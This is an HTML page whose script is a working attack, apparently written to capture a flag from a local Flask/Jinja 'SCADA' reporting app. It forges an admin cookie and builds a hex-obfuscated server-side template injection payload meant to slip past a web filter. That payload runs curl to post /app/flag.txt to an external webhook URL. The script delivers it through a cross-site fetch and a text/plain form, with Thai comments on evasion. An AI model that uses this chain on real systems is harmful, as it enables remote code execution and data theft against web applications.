<html>
  <body>
    <script>
      // 1. Forge Admin Session (Base64 of {"username":"admin","role":"admin"})
      const adminCookie =
        "eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0=";

      // 2. SSTI Payload (Hex encoded to bypass WAF)
      const payload = `{{ get_flashed_messages|attr("\\x5f\\x5fglobals\\x5f\\x5f")|attr("get")("\\x6fs")|attr("\\x70open")("curl -X POST -d @/app/flag.txt https://webhook.site/c8b5eb75-9989-4b28-8dfa-6b11ee60562f")|attr("read")() }}`;

      // 3. Send POST request to internal SCADA app using fetch
      // Note: We use 'no-cors' because we don't need to read the response, just execute it
      fetch("http://127.0.0.1:5000/api/reports/generate", {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          template: payload,
        }),
      });

      // การยิงผ่าน Form จะช่วยให้ Cookie ถูกส่งไปด้วยได้ดีกว่าในบางเคส
      const form = document.createElement("form");
      form.method = "POST";
      form.action = "http://127.0.0.1:5000/api/reports/generate";
      form.enctype = "text/plain"; // เพื่อหลบเลี่ยงการตรวจสอบ Content-Type บางอย่าง

      const input = document.createElement("input");
      input.name = '{"template":"' + payload + '", "ignore":"';
      input.value = '"}';

      form.appendChild(input);
      document.body.appendChild(form);

      // ตั้ง Cookie ปลอมก่อนส่ง (ถ้าโดเมน/IP เอื้ออำนวย)
      // แต่ในกรณี 127.0.0.1 วิธีที่ดีที่สุดคือการยิง SSTI ผ่านจุดที่ Admin Bot มี Session อยู่แล้ว
      // หรือใช้เทคนิคการยิงผ่าน API ตรงๆ
    </script>
  </body>
</html>
